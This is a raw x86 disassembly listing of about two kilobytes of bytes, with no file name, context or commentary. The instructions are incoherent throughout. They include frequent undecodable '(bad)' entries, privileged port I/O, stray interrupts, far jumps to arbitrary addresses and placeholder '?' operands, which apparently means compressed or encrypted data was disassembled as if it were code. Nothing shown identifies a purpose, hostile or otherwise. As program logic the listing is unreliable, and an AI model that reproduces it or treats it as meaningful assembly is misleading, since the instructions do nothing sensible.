  419592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419593:	fwait
  419594:	out    dx,eax
  419595:	(bad)
  419599:	or     DWORD PTR [esi+0x1d3049ca],ebp
  41959f:	adc    al,0x31
  4195a1:	inc    edx
  4195a2:	test   esi,ebx
  4195a4:	jo     0x41957d
  4195a6:	or     edx,DWORD PTR ds:0x7a0f50c
  4195ac:	lods   eax,DWORD PTR ds:[esi]
  4195ad:	add    DWORD PTR [ebx-0x7d7cc5],0x3e
  4195b4:	push   edx
  4195b5:	iret   
  4195b6:	gs ins DWORD PTR es:[edi],dx
  4195b8:	popf   
  4195b9:	add    esp,esp
  4195bb:	add    DWORD PTR [ebp-0x7f],0x47
  4195bf:	pop    ebp
  4195c0:	xchg   esi,eax
  4195c1:	in     eax,0x5b
  4195c3:	and    ecx,DWORD PTR [ecx-0xf108c78]
  4195c9:	and    DWORD PTR [ecx+0x15],esp
  4195cc:	sub    DWORD PTR [edx],ecx
  4195ce:	loop   0x4195bf
  4195d0:	inc    esi
  4195d1:	or     BYTE PTR [ebp-0x54],ch
  4195d4:	jecxz  0x419639
  4195d6:	or     ah,BYTE PTR [edx-0x6d]
  4195d9:	pop    ebp
  4195da:	test   eax,0x32cd0a25
  4195df:	popf   
  4195e0:	cmp    BYTE PTR [ebp-0x52],0x7e
  4195e4:	test   BYTE PTR [ebx+0x7db8826],cl
  4195ea:	xor    al,0x71
  4195ec:	lock dec esp
  4195ee:	icebp  
  4195ef:	addr16 push ds
  4195f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f2:	xor    DWORD PTR [ebx],edx
  4195f4:	push   cs
  4195f5:	push   esi
  4195f6:	outs   dx,DWORD PTR ds:[esi]
  4195f7:	sbb    esi,DWORD PTR [ebx+0x7]
  4195fa:	adc    BYTE PTR [ebp+0x47],bl
  4195fd:	adc    edx,ebx
  4195ff:	push   esi
  419600:	mov    DWORD PTR [eax+0x10],ecx
  419603:	cli    
  419604:	ficom  DWORD PTR ds:0xa8e71f65
  41960a:	(bad)  
  41960b:	in     al,0xcd
  41960d:	test   edi,esi
  41960f:	lods   eax,DWORD PTR ds:[esi]
  419610:	xchg   ecx,eax
  419611:	outs   dx,DWORD PTR ds:[esi]
  419612:	mov    bl,0x52
  419614:	test   DWORD PTR [edx-0x1a957dc6],eax
  41961a:	mov    ebx,0xc2b8ed2
  41961f:	cmp    DWORD PTR [ebx-0x68],edi
  419622:	dec    edi
  419623:	jb     0x41969b
  419625:	jnp    0x419616
  419627:	xchg   ecx,eax
  419628:	sub    BYTE PTR [ebp+0x14],dl
  41962b:	mov    esi,0x11e4c3be
  419630:	outs   dx,BYTE PTR ds:[esi]
  419631:	push   edx
  419632:	(bad)  
  419633:	push   eax
  419634:	xchg   esp,eax
  419635:	push   es
  419636:	daa    
  419637:	cwde   
  419638:	or     al,0xf0
  41963a:	xlat   BYTE PTR ds:[ebx]
  41963b:	aaa    
  41963c:	sub    dl,dl
  41963e:	dec    edx
  41963f:	call   0xe85bee6c
  419644:	pop    esp
  419645:	sub    eax,0xcb06068b
  41964a:	loopne 0x419636
  41964c:	jo     0x419630
  41964e:	scas   eax,DWORD PTR es:[edi]
  41964f:	bound  edx,QWORD PTR [edx-0x4d]
  419652:	loop   0x419624
  419654:	mov    BYTE PTR ds:0x14a72aac,al
  41965a:	cmp    eax,0xdb2d8c0f
  41965f:	xchg   BYTE PTR [edi],bl
  419661:	popf   
  419662:	mov    ds,WORD PTR [ecx+0x56bd031e]
  419668:	popf   
  419669:	cli    
  41966a:	or     dl,0x44
  41966d:	out    0x3e,eax
  41966f:	arpl   WORD PTR [ebp-0x71],si
  419672:	fcom   st(5)
  419674:	add    al,BYTE PTR [edi+0x40]
  419677:	mul    DWORD PTR [eax-0x6e]
  41967a:	je     0x4196bc
  41967c:	push   edx
  41967d:	imul   edx,DWORD PTR [esi+0x67c260a9],0x15
  419684:	sbb    DWORD PTR [edx-0x71d05caa],esi
  41968a:	jns    0x4196b3
  41968c:	pop    es
  41968d:	imul   esp,DWORD PTR [edi-0x22],0x29
  419691:	(bad)  
  419692:	sbb    dl,BYTE PTR [ebx]
  419694:	(bad)  
  419695:	xor    al,0x13
  419697:	xchg   ebp,eax
  419698:	jmp    0x419639
  41969a:	push   edx
  41969b:	inc    edi
  41969c:	(bad)  
  41969d:	push   ebx
  41969e:	and    BYTE PTR [edx-0x21],0x8e
  4196a2:	xor    eax,0x5aee4004
  4196a7:	aad    0x22
  4196a9:	add    ch,BYTE PTR [edx+0x6c745007]
  4196af:	mov    ds:0x53229010,al
  4196b4:	loope  0x4196b9
  4196b6:	sub    eax,ebp
  4196b8:	call   esp
  4196ba:	js     0x41967a
  4196bc:	xchg   ecx,eax
  4196bd:	sub    cl,BYTE PTR [edi-0x8]
  4196c0:	inc    ebp
  4196c1:	loop   0x4196b6
  4196c3:	(bad)  
  4196c4:	fidiv  DWORD PTR [ecx]
  4196c6:	repnz rol bh,0xaa
  4196ca:	data16 in al,dx
  4196cc:	mov    WORD PTR [eax-0x69],es
  4196cf:	xchg   esi,eax
  4196d0:	jnp    0x419667
  4196d2:	xchg   DWORD PTR [edx],edx
  4196d4:	repnz cld 
  4196d6:	dec    esi
  4196d7:	pop    edx
  4196d8:	xchg   esi,eax
  4196d9:	gs mov ecx,0x9af66a8c
  4196df:	mov    BYTE PTR [ebp-0x7e],bl
  4196e2:	mov    dh,ah
  4196e4:	stos   BYTE PTR es:[edi],al
  4196e5:	gs cmp eax,0x799f32b3
  4196eb:	test   BYTE PTR [edi+0x74],0x43
  4196ef:	inc    edx
  4196f0:	inc    ecx
  4196f1:	test   DWORD PTR [ecx+edi*1+0x4f6d20f1],0x97060ccf
  4196fc:	jg     0x419703
  4196fe:	test   dl,dl
  419700:	dec    edx
  419701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419702:	xor    ah,BYTE PTR [ebx+0x20]
  419705:	sub    esi,DWORD PTR ds:0xa52be6ae
  41970b:	loope  0x41977d
  41970d:	jp     0x41977e
  41970f:	ins    DWORD PTR es:[edi],dx
  419710:	aas    
  419711:	jecxz  0x419735
  419713:	stos   DWORD PTR es:[edi],eax
  419714:	add    dl,ah
  419716:	outs   dx,BYTE PTR ds:[esi]
  419717:	mov    eax,0xbc78ff74
  41971c:	idiv   DWORD PTR [edi-0x1d472c61]
  419722:	and    cl,ch
  419724:	mov    ebx,0xb50a4094
  419729:	push   0x13
  41972b:	adc    BYTE PTR [ecx],al
  41972d:	sbb    al,0xab
  41972f:	dec    ecx
  419730:	mov    ebx,0xedaadfc1
  419735:	popa   
  419736:	xchg   edi,eax
  419737:	outs   dx,DWORD PTR ds:[esi]
  419738:	mov    al,BYTE PTR [esi-0x5f]
  41973b:	xor    al,0xcd
  41973d:	idiv   ebp
  41973f:	int    0x58
  419741:	mov    al,0x75
  419743:	dec    ebp
  419744:	js     0x4196e5
  419746:	int3   
  419747:	daa    
  419748:	or     bh,BYTE PTR [ebx]
  41974a:	adc    al,0x69
  41974c:	sbb    DWORD PTR [esi],edx
  41974e:	shl    DWORD PTR [esi],1
  419750:	out    0xe9,eax
  419752:	or     ebp,DWORD PTR [ebx+ebx*4+0x3f]
  419756:	rcr    BYTE PTR [ebp-0x673fcd68],0x7a
  41975d:	scas   al,BYTE PTR es:[edi]
  41975e:	jnp    0x419722
  419760:	push   0x8c9b7625
  419765:	clc    
  419766:	(bad)  
  419767:	int3   
  419768:	add    eax,ebp
  41976a:	sti    
  41976b:	mov    ebx,0xc3b62c98
  419770:	inc    ecx
  419771:	sub    eax,0xe401c810
  419776:	push   ds
  419777:	mov    eax,0xde0465d3
  41977c:	push   ebx
  41977d:	inc    ebp
  41977e:	mov    eax,ds:0xc2aad2d8
  419783:	pop    esp
  419784:	mov    al,0xfc
  419786:	lea    eax,[ebx-0x65]
  419789:	leave  
  41978a:	mov    dh,0xfa
  41978c:	addr16 jb 0x4197a3
  41978f:	or     al,0xfc
  419791:	mov    al,ds:0xb458cd56
  419796:	int    0x53
  419798:	mov    eax,0xc6e1c019
  41979d:	sbb    BYTE PTR [eax-0x2945972f],dl
  4197a3:	lahf   
  4197a4:	(bad)
  4197a7:	in     eax,dx
  4197a8:	xor    dl,BYTE PTR [edi]
  4197aa:	pop    ebx
  4197ab:	mov    ecx,0xfc612420
  4197b0:	repnz outs dx,BYTE PTR ds:[esi]
  4197b2:	je     0x419735
  4197b4:	jno    0x4197af
  4197b6:	push   ss
  4197b7:	jl     0x419747
  4197b9:	jo     0x419764
  4197bb:	mov    ebp,0x596151de
  4197c0:	lods   al,BYTE PTR ds:[esi]
  4197c1:	(bad)
  4197c4:	sbb    ebp,ebp
  4197c6:	data16 aaa 
  4197c8:	jle    0x41983e
  4197ca:	jmp    0xbe76b028
  4197cf:	addr16 xchg ax,ax
  4197d2:	sbb    ebp,DWORD PTR [esi+0x7019ea68]
  4197d8:	not    edx
  4197da:	std    
  4197db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197dc:	dec    ebx
  4197dd:	inc    esp
  4197de:	or     BYTE PTR [eax],dl
  4197e0:	enter  0x25c7,0x35
  4197e4:	or     DWORD PTR [eax],edi
  4197e6:	imul   ebp,ebp,0x47ccc015
  4197ec:	popa   
  4197ed:	ds pop esi
  4197ef:	cli    
  4197f0:	mov    ebx,0x73a4366f
  4197f5:	dec    edi
  4197f6:	clc    
  4197f7:	and    BYTE PTR [edi-0x398780b4],dl
  4197fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fe:	sti    
  4197ff:	cmp    esi,0xeb6e6e03
  419805:	out    dx,al
  419806:	aas    
  419807:	out    0x2d,eax
  419809:	xchg   ebp,eax
  41980a:	add    al,0x75
  41980c:	or     BYTE PTR [ebx+0x51],bl
  41980f:	mov    edx,DWORD PTR [edx]
  419811:	jnp    0x419869
  419813:	shl    BYTE PTR ds:0x281aae01,cl
  419819:	bound  edi,QWORD PTR [esi]
  41981b:	setnp  bh
  41981e:	xor    esi,ecx
  419820:	pushf  
  419821:	dec    ebp
  419822:	mov    ah,0xbb
  419824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419825:	clc    
  419826:	cmp    al,0x7
  419828:	sbb    DWORD PTR [edi+ebp*4-0x3],eax
  41982c:	stos   DWORD PTR es:[edi],eax
  41982d:	cli    
  41982e:	jmp    0x1a7f4315
  419833:	adc    eax,ebp
  419835:	add    BYTE PTR [ebx-0xdfdb98b],al
  41983b:	mov    edx,0x71da04d1
  419840:	mov    edx,esp
  419842:	std    
  419843:	call   0xe730:0xa3c17a73
  41984a:	test   DWORD PTR [edi-0x7],edi
  41984d:	loop   0x41981b
  41984f:	clc    
  419850:	push   ss
  419851:	arpl   WORD PTR [ecx-0x78fda7fc],bx
  419857:	sub    DWORD PTR [eax],ebp
  419859:	mov    bl,0xe7
  41985b:	popa   
  41985c:	enter  0x12b8,0x1d
  419860:	cdq    
  419861:	jne    0x41985e
  419863:	repz test BYTE PTR [esi+esi*8-0x5d],ah
  419868:	xchg   edx,eax
  419869:	es mov dh,0xb2
  41986c:	adc    DWORD PTR [edi],eax
  41986e:	add    al,al
  419870:	adc    edi,DWORD PTR [edx+eiz*1]
  419873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419874:	pop    ds
  419875:	mov    edx,0x5e50a6ff
  41987a:	imul   edx,DWORD PTR [eax],0x7c
  41987d:	shl    BYTE PTR [edx+0x44dc36df],0x3a
  419884:	or     al,0x14
  419886:	lods   eax,DWORD PTR ds:[esi]
  419887:	fmul   DWORD PTR [edi+edi*8+0x6530e10]
  41988e:	imul   ebx,DWORD PTR [ecx+0x63],0x8d11b501
  419895:	lea    ecx,[ecx+0xc2aba5b]
  41989b:	sbb    al,0xc3
  41989d:	lahf   
  41989e:	or     BYTE PTR [edi+0x22],bh
  4198a1:	rcr    ecx,cl
  4198a3:	mov    esp,DWORD PTR [esp+ebx*1-0x38034b84]
  4198aa:	std    
  4198ab:	push   ebx
  4198ac:	call   0x5d4cc0c6
  4198b1:	test   al,0xc7
  4198b3:	out    dx,al
  4198b4:	daa    
  4198b5:	shl    cl,0x5a
  4198b8:	dec    esp
  4198b9:	imul   eax,DWORD PTR [eax+0x59],0x37b4c0c1
  4198c0:	(bad)  
  4198c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c3:	mov    ebp,0x2d267b37
  4198c8:	jb     0x419936
  4198ca:	out    dx,al
  4198cb:	mov    eax,gs
  4198cd:	pop    ss
  4198ce:	rcr    DWORD PTR [esi-0x5455671d],0x18
  4198d5:	sub    ah,BYTE PTR [esi-0x6aa8e8fa]
  4198db:	aam    0x5b
  4198dd:	iret   
  4198de:	xor    dl,dh
  4198e0:	or     bl,cl
  4198e2:	jle    0x41987f
  4198e4:	arpl   WORD PTR [edi+0x2a],ax
  4198e7:	sbb    BYTE PTR [ebp+0x3d],ch
  4198ea:	jo     0x4198d6
  4198ec:	stc    
  4198ed:	cmp    eax,0xf6596fe2
  4198f2:	sub    cl,bh
  4198f4:	and    al,0x8
  4198f6:	xor    eax,edi
  4198f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f9:	push   es
  4198fa:	mov    bh,0x17
  4198fc:	or     BYTE PTR [ecx-0x4f],bh
  4198ff:	or     edi,DWORD PTR [ebp-0x2858c99b]
  419905:	mov    eax,ds:0x516c63c0
  41990a:	dec    ebx
  41990b:	add    BYTE PTR [edx+0x1b],bl
  41990e:	(bad)  
  41990f:	jbe    0x4198c5
  419911:	nop
  419912:	(bad)  
  419913:	mov    cl,0x44
  419915:	jnp    0x419917
  419917:	mov    eax,ds:0xae81e6a8
  41991c:	add    ch,BYTE PTR ds:0x107bd1d4
  419922:	jmp    FWORD PTR [edi-0x31a4c653]
  419928:	je     0x419968
  41992a:	xor    BYTE PTR [ebx-0x7e89f017],dh
  419930:	push   es
  419931:	mov    fs,esp
  419933:	stos   BYTE PTR es:[edi],al
  419934:	cmp    DWORD PTR es:[eax-0x3a11a868],ecx
  41993b:	lock xchg DWORD PTR [edi+ecx*1-0xf],ebp
  419940:	(bad)  [ebp+ebp*1-0x49f031e4]
  419947:	(bad)
  41994b:	mov    ebx,0x868fbabb
  419950:	xchg   DWORD PTR [edx+edx*1],ebx
  419953:	push   0x8c45d1f8
  419958:	jbe    0x419925
  41995a:	push   es
  41995b:	scas   al,BYTE PTR es:[edi]
  41995c:	mov    dh,BYTE PTR [eax+0x7c3df9c]
  419962:	loopne 0x4199d7
  419964:	adc    ch,bh
  419966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419967:	ss inc esp
  419969:	or     DWORD PTR [ecx+eiz*1+0x61],esi
  41996d:	adc    ah,bh
  41996f:	mov    eax,ds:0x4485d01a
  419974:	adc    al,0xfd
  419976:	pop    ds
  419977:	sub    DWORD PTR [esi+0x166da393],0x59
  41997e:	outs   dx,DWORD PTR ds:[esi]
  41997f:	pop    ebp
  419980:	dec    edx
  419981:	or     al,0x62
  419983:	inc    eax
  419984:	ins    DWORD PTR es:[edi],dx
  419985:	sub    al,0xe1
  419987:	inc    edx
  419988:	shrd   DWORD PTR [esi+0x1a6ed19d],eax,0xf
  419990:	stos   BYTE PTR es:[edi],al
  419991:	ficomp WORD PTR [ebx+edi*1-0x3107996f]
  419998:	(bad)  
  419999:	xor    eax,0x69b95ccc
  41999e:	jl     0x419996
  4199a0:	lahf   
  4199a1:	xchg   ebx,eax
  4199a2:	std    
  4199a3:	push   0x1
  4199a5:	repz jge 0x4199c7
  4199a8:	pop    es
  4199a9:	(bad)  
  4199aa:	inc    esp
  4199ab:	xor    DWORD PTR [esi+ebp*4-0x4e],edx
  4199af:	pop    eax
  4199b0:	and    ecx,DWORD PTR [edx]
  4199b2:	xchg   ebx,eax
  4199b3:	arpl   WORD PTR ds:0x8562d5cc,cx
  4199b9:	es or  al,0x17
  4199bc:	mov    cl,0x6f
  4199be:	sub    BYTE PTR [ebp+eiz*2-0x75],ch
  4199c2:	fcomp  DWORD PTR [ebx+eax*8-0x795f4c20]
  4199c9:	iret   
  4199ca:	lea    ebp,[eax+0x26852519]
  4199d0:	shl    DWORD PTR [ebp+0x3a233213],0x59
  4199d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199d8:	dec    ebx
  4199d9:	inc    esp
  4199da:	pop    esi
  4199db:	add    BYTE PTR [eax+0x79a21286],al
  4199e1:	and    DWORD PTR gs:[esi-0x72bff554],esp
  4199e8:	xor    BYTE PTR [esi+ecx*8+0xa1d0eec],dl
  4199ef:	(bad)  
  4199f0:	cwde   
  4199f1:	jecxz  0x4199c7
  4199f3:	ja     0x419a58
  4199f5:	mov    esp,0xc4e9d50b
  4199fa:	aas    
  4199fb:	std    
  4199fc:	adc    ch,cl
  4199fe:	pop    ds
  4199ff:	cdq    
  419a00:	repnz and dl,BYTE PTR [ebx]
  419a03:	ret    0x46b5
  419a06:	clc    
  419a07:	aad    0xc4
  419a09:	in     eax,dx
  419a0a:	mov    ebx,tr7
  419a0d:	xchg   esp,eax
  419a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a0f:	inc    ebx
  419a10:	stos   BYTE PTR es:[edi],al
  419a11:	inc    eax
  419a12:	or     edx,edx
  419a14:	js     0x419a1a
  419a16:	ins    DWORD PTR es:[edi],dx
  419a17:	sbb    BYTE PTR [esi+0x5e],0xe3
  419a1b:	dec    ebx
  419a1c:	cmp    al,0xdf
  419a1e:	mov    eax,ds:0x3bac1a2b
  419a23:	pop    edx
  419a24:	pop    ss
  419a25:	xchg   esp,eax
  419a26:	inc    eax
  419a27:	jo     0x419a3c
  419a29:	sbb    BYTE PTR [esi+0x8031e18],bh
  419a2f:	mov    al,0x1d
  419a31:	sbb    al,0x72
  419a33:	mov    WORD PTR ds:0xa570d994,?
  419a39:	daa    
  419a3a:	mov    ecx,0xd0638305
  419a3f:	sahf   
  419a40:	out    0x40,eax
  419a42:	jecxz  0x419a67
  419a44:	push   0xf49081
  419a49:	and    al,0x86
  419a4b:	mov    ah,0xde
  419a4d:	xor    BYTE PTR [ecx-0x42030ae],0x3b
  419a54:	mov    esi,0x9b3f6a45
  419a59:	adc    BYTE PTR [ecx+0x29ba3bea],0x9b
  419a60:	pop    esi
  419a61:	sbb    bl,BYTE PTR [edi+0x684aae6f]
  419a67:	idiv   DWORD PTR [esi+0x5f]
  419a6a:	xchg   ebp,eax
  419a6b:	jb     0x419aa4
  419a6d:	sbb    ecx,esp
  419a6f:	and    esp,ebx
  419a71:	dec    esi
  419a72:	into   
  419a73:	rol    edi,cl
  419a75:	pop    esp
  419a76:	call   0x65dcaebe
  419a7b:	xchg   ebp,eax
  419a7c:	stos   BYTE PTR es:[edi],al
  419a7d:	sti    
  419a7e:	inc    edi
  419a7f:	push   eax
  419a80:	adc    dl,dl
  419a82:	inc    esp
  419a83:	outs   dx,BYTE PTR ds:[esi]
  419a84:	leave  
  419a85:	iret   
  419a86:	outs   dx,BYTE PTR ds:[esi]
  419a87:	int    0xf4
  419a89:	dec    ecx
  419a8a:	and    esi,DWORD PTR [eax]
  419a8c:	adc    DWORD PTR [ecx],esi
  419a8e:	into   
  419a8f:	ins    DWORD PTR es:[edi],dx
  419a90:	sar    DWORD PTR [edi-0x3b],0x1a
  419a94:	cmp    dh,BYTE PTR [ebx-0x7d25e21]
  419a9a:	mov    eax,0xd192ca02
  419a9f:	xchg   BYTE PTR [eax-0x5ab1c06],al
  419aa5:	push   edi
  419aa6:	mov    edx,0x643ac0af
  419aab:	out    0xb,al
  419aad:	das    
  419aae:	ss cmp al,0x5f
  419ab1:	push   ebx
  419ab2:	clc    
  419ab3:	push   eax
  419ab4:	leave  
  419ab5:	(bad)  
  419ab6:	rcr    DWORD PTR [edi],1
  419ab8:	repnz in eax,0xc6
  419abb:	fist   DWORD PTR [esi+ebp*1]
  419abe:	cld    
  419abf:	xchg   DWORD PTR [ecx-0x2c2010c9],esp
  419ac5:	jl     0x419a4d
  419ac7:	push   es
  419ac8:	fiadd  WORD PTR [edi]
  419aca:	dec    edx
  419acb:	(bad)  [edx+0x7866aee5]
  419ad1:	mov    ah,0x87
  419ad3:	(bad)  
  419ad4:	mov    al,ds:0xabf9ec9d
  419ad9:	mov    ?,WORD PTR [ebx+0x40]
  419adc:	jno    0x419ae6
  419ade:	cmp    al,0xe9
  419ae0:	test   esi,0xc40666bb
  419ae6:	xor    esp,DWORD PTR [eax]
  419ae8:	mov    WORD PTR [edx],?
  419aea:	push   cs
  419aeb:	add    eax,0x6d7709cf
  419af0:	out    0xcf,eax
  419af2:	jecxz  0x419b0e
  419af4:	push   ebp
  419af5:	int3   
  419af6:	(bad)  
  419af7:	enter  0x34c8,0x8c
  419afb:	push   ebx
  419afc:	or     edx,DWORD PTR [ebx]
  419afe:	rcr    DWORD PTR [ebp+0xc227b4c],1
  419b04:	push   ss
  419b05:	sub    ch,BYTE PTR [ebx]
  419b07:	enter  0x82e,0xff
  419b0b:	or     eax,0x8212218e
  419b10:	retf   0x2fd4
  419b13:	jbe    0x419b75
  419b15:	test   DWORD PTR [ecx+0x3d],ecx
  419b18:	ins    DWORD PTR es:[edi],dx
  419b19:	mov    ecx,0xfb28af61
  419b1e:	xor    BYTE PTR [eax+0x1e844441],al
  419b24:	lds    esp,FWORD PTR [ebp+0x4b]
  419b27:	mov    ch,0x82
  419b29:	aad    0x23
  419b2b:	dec    ebp
  419b2c:	xchg   ebx,eax
  419b2d:	les    eax,FWORD PTR [ebx+0x6ab8224c]
  419b33:	leave  
  419b34:	add    bl,al
  419b36:	int    0xa2
  419b38:	pop    ebp
  419b39:	pop    edi
  419b3a:	jno    0x419b53
  419b3c:	mov    BYTE PTR [edx],0x8f
  419b3f:	lock xchg ecx,eax
  419b41:	cmp    al,0x44
  419b43:	cmp    eax,0x6847ca1e
  419b48:	adc    al,0x41
  419b4a:	and    al,0x8e
  419b4c:	xor    DWORD PTR [esi-0xc4375e0],0xcf81c357
  419b56:	leave  
  419b57:	sub    ecx,DWORD PTR [ebx]
  419b59:	or     al,0x7
  419b5b:	arpl   WORD PTR [eax-0x48],bx
  419b5e:	das    
  419b5f:	pop    edx
  419b60:	js     0x419b49
  419b62:	jge    0x419aea
  419b64:	push   cs
  419b65:	mov    ds:0x6bf4dfe9,al
  419b6a:	stc    
  419b6b:	add    dh,0x80
  419b6e:	outs   dx,BYTE PTR ds:[esi]
  419b6f:	lock inc edi
  419b71:	mov    esp,0x7f1c0d32
  419b76:	std    
  419b77:	cmp    cl,dh
  419b79:	adc    al,0x27
  419b7b:	das    
  419b7c:	jle    0x419b53
  419b7e:	sub    ebp,DWORD PTR [ebp-0x62bfc64a]
  419b84:	fistp  WORD PTR [ebp+0x6a]
  419b87:	lods   eax,DWORD PTR ds:[esi]
  419b88:	and    dl,bl
  419b8a:	js     0x419c05
  419b8c:	jl     0x419b72
  419b8e:	sub    esi,esp
  419b90:	loopne 0x419b9c
  419b92:	jne    0x419b9b
  419b94:	hlt    
  419b95:	mov    esi,DWORD PTR [ebx+eax*1]
  419b98:	push   0xf8a28cdf
  419b9d:	adc    eax,0xc17157ac
  419ba2:	jg     0x419bac
  419ba4:	(bad)  [eax]
  419ba6:	jl     0x419bad
  419ba8:	push   esi
  419ba9:	cdq    
  419baa:	cmp    al,0x6d
  419bac:	ficom  WORD PTR [edi+eax*2+0x8588581]
  419bb3:	fld    DWORD PTR [ecx]
  419bb5:	js     0x419bd4
  419bb7:	iret   
  419bb8:	in     eax,dx
  419bb9:	rcr    BYTE PTR [esi+0x22],1
  419bbc:	dec    ebp
  419bbd:	(bad)  
  419bbe:	or     bh,BYTE PTR [eax+0x7d0516af]
  419bc4:	and    eax,0xe98e1220
  419bc9:	push   esi
  419bca:	add    eax,0x2ea1d260
  419bcf:	sbb    eax,DWORD PTR ds:[esi-0x457ae197]
  419bd6:	arpl   WORD PTR [edx+0x55],dx
  419bd9:	fwait
  419bda:	mov    esi,0x95715faa
  419bdf:	aaa    
  419be0:	dec    eax
  419be1:	stc    
  419be2:	adc    DWORD PTR [esi-0x19],esi
  419be5:	adc    BYTE PTR [edx],ch
  419be7:	aad    0xea
  419be9:	dec    edx
  419bea:	jg     0x419c6b
  419bec:	(bad)  
  419bed:	leave  
  419bee:	fst    st(1)
  419bf0:	pop    esi
  419bf1:	loopne 0x419ba5
  419bf3:	imul   edx,DWORD PTR [edi-0x145f0d82],0xb8fe43d8
  419bfd:	in     eax,dx
  419bfe:	pop    ebx
  419bff:	adc    eax,0x98b79f85
  419c04:	push   0xffffff85
  419c06:	bound  eax,QWORD PTR [eax]
  419c08:	mov    eax,0x4cec4fd9
  419c0d:	mov    ebp,0x2ac11481
  419c12:	xchg   ah,dh
  419c14:	retf   
  419c15:	out    dx,al
  419c16:	bound  ebx,QWORD PTR [ebx-0x6c]
  419c19:	iret   
  419c1a:	add    DWORD PTR [ecx+eax*4],ebp
  419c1d:	xchg   BYTE PTR [eax-0x2242cb5a],dl
  419c23:	cs jmp 0x1d20:0x1f70c7ac
  419c2b:	jno    0x419bb6
  419c2d:	ss mov cl,0xcb
  419c30:	mov    WORD PTR ds:0x9ee90ed1,cs
  419c36:	jp     0x419c3f
  419c38:	into   
  419c39:	xchg   al,cl
  419c3b:	pop    esi
  419c3c:	mov    al,ds:0xce708394
  419c41:	adc    ch,BYTE PTR [edi+edx*4]
  419c44:	sbb    esi,DWORD PTR [esi]
  419c46:	xchg   dl,bh
  419c48:	xor    al,0x5f
  419c4a:	outs   dx,DWORD PTR ds:[esi]
  419c4b:	inc    ebp
  419c4c:	dec    eax
  419c4d:	repz xor al,0xfc
  419c50:	stos   DWORD PTR es:[edi],eax
  419c51:	add    al,0x48
  419c53:	xchg   esp,eax
  419c54:	jns    0x419c05
  419c56:	sub    eax,0xfecb8b04
  419c5b:	(bad)
  419c5e:	into   
  419c5f:	and    DWORD PTR [edx],edx
  419c61:	imul   edx,DWORD PTR [ebp+0x12ab15ea],0xffffffd8
  419c68:	jle    0x419ccb
  419c6a:	or     BYTE PTR ds:0x6da381ae,dh
  419c70:	mov    ah,0x3a
  419c72:	mov    DWORD PTR ds:0xd8de7e72,ebp
  419c78:	push   ds
  419c79:	mov    bh,0x5e
  419c7b:	arpl   bx,di
  419c7d:	mov    ecx,0xbd3a838c
  419c82:	mov    bh,0xb9
  419c84:	mov    WORD PTR [ebx-0x1b],ds
  419c87:	leave  
  419c88:	cs clc 
  419c8a:	iret   
  419c8b:	or     eax,0x3070f0ae
  419c90:	imul   edx,edx,0xffffffc2
  419c93:	xor    BYTE PTR ds:0xbb4641c3,bl
  419c99:	retf   0x124c
  419c9c:	mov    cl,0x57
  419c9e:	inc    ebp
  419c9f:	mov    ds:0x397b48ac,al
  419ca4:	dec    ebx
  419ca5:	sar    DWORD PTR [edi+0x3a],0x4c
  419ca9:	or     DWORD PTR [ecx],eax
  419cab:	or     DWORD PTR [edi],eax
  419cad:	(bad)  
  419cae:	fadd   QWORD PTR [ebx+0x52172ce2]
  419cb4:	dec    ebx
  419cb5:	or     ch,ch
  419cb7:	cmp    eax,0x5999f483
  419cbc:	ficomp WORD PTR [ebx+0x10]
  419cbf:	mov    dl,BYTE PTR [ecx]
  419cc1:	lds    esp,FWORD PTR [edx]
  419cc3:	and    BYTE PTR [ebx+ebp*1-0x2b],ah
  419cc7:	cmp    al,0x94
  419cc9:	and    al,0x79
  419ccb:	sbb    BYTE PTR [eax-0x3e],cl
  419cce:	sbb    ebp,eax
  419cd0:	mov    ah,0x2c
  419cd2:	mov    eax,0xef8ed0bc
  419cd7:	and    DWORD PTR [ebx-0x52],esp
  419cda:	and    BYTE PTR [edx],dl
  419cdc:	mov    WORD PTR [esi+0x20],gs
  419cdf:	or     eax,0x711b8844
  419ce4:	dec    ecx
  419ce5:	jbe    0x419d0a
  419ce7:	clc    
  419ce8:	xor    al,0x2
  419cea:	(bad)  [edx]
  419cec:	inc    ecx
  419ced:	fld    TBYTE PTR [edx-0x2d]
  419cf0:	or     al,0x12
  419cf2:	sar    esp,0x95
  419cf5:	jb     0x419d3e
  419cf7:	xchg   esi,eax
  419cf8:	clc    
  419cf9:	lahf   
  419cfa:	mov    edx,0xc796be65
  419cff:	cmp    DWORD PTR [edx+0x6992097e],esi
  419d05:	sbb    BYTE PTR [edx+0x809439a],dl
  419d0b:	mov    bl,0xaa
  419d0d:	mov    eax,0x1126071
  419d12:	shl    DWORD PTR [edi-0x60],1
  419d15:	mov    bl,0x90
  419d17:	cmp    al,BYTE PTR [eax+0x3f]
  419d1a:	sbb    bh,BYTE PTR [edx]
  419d1c:	push   eax
  419d1d:	mov    ecx,0x52e8413d
  419d22:	or     al,0x86
  419d24:	push   0xffffff87
  419d26:	mov    ebx,0x8e4c5679
  419d2b:	out    dx,al
  419d2c:	int3   
  419d2d:	rcr    al,1
  419d2f:	stos   BYTE PTR es:[edi],al
  419d30:	inc    edx
  419d31:	mov    eax,ds:0x1f2e744f
  419d36:	mov    ecx,0xd700a8fb
  419d3b:	adc    al,0x35
  419d3d:	imul   ebx,DWORD PTR [ebx+0x47],0xfc79c7eb
  419d44:	xchg   ecx,eax
  419d45:	mov    edx,0x445c8fec
  419d4a:	into   
  419d4b:	mov    ds:0x4706b2b3,eax
  419d50:	cmc    
  419d51:	adc    eax,0x514d4208
  419d56:	test   BYTE PTR [edi],cl
  419d58:	inc    eax
  419d59:	pop    esi
  419d5a:	fadd   st(0),st
  419d5c:	or     esp,ecx
  419d5e:	das    
  419d5f:	shr    DWORD PTR [ebx],0x7b
  419d62:	jle    0x419db2
  419d64:	or     BYTE PTR [ecx-0x2681fb65],dh
